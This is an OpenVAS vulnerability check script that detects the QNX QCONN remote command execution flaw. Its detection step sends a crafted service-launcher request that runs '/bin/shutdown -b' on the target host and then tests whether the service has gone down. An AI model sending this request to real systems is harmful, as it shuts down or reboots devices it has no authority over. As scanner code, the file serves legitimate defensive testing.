###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_qnx_qconn_rtos_remote_code_exec_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# QNX QCONN Remote Command Execution Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation may allow remote attackers to execute arbitrary code
  or cause a denial of service condition and compromise the system.
  Impact Level: System/Application";
tag_affected = "QNX version 6.5.0 and prior";
tag_insight = "The flaw is due to error in 'QCONN' when handling the crafted
  requests. This can be exploited to execute arbitrary code  via a specially
  crafted packet sent to port 8000.";
tag_solution = "No solution or patch is available as of 26th September, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.qnx.com";
tag_summary = "This host is running QNX RTOS and is prone to remote code
  execution vulnerability.";

if(description)
{
  script_id(802461);
  script_version("$Revision: 12 $");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-09-26 13:12:00 +0530 (Wed, 26 Sep 2012)");
  script_name("QNX QCONN Remote Command Execution Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://1337day.com/exploits/1946");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/21520/");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/116877/QNX-QCONN-Remote-Command-Execution.html");

  script_description(desc);
  script_summary("Determine is it possible to execute code in QNX RTOS");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("General");
  script_require_ports(8000);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

## Variable Initialization
port= "";
soc = "";
res = "";
req = "";

## Default Port
port = 8000;
if(!get_port_state(port)){
  exit(0);
}

## Open TCP Socket
soc = open_sock_tcp(port);
if(!soc){
  exit(0);
}

## Check Banner And Confirm Application
res = recv(socket:soc, length:1024);
if("QCONN" >!< res)
{
  close(soc);
  exit(0);
}

## Construct the attack request
req = string("service launcher\n",
             "start/flags ", port, " /bin/shutdown /bin/shutdown -b\n",
             "continue\n");

## Sending constructed request
send(socket:soc, data:req);
close(soc);

## Waiting
sleep(3);

## Try to Open Socket
if(soc =  open_sock_tcp(port))
{
  res = recv(socket:soc, length:1024);
  if("QCONN" >!< res)
  {
   close(soc);
   security_hole(port);
   exit(0);
  }
}

else{
  security_hole(port);
}
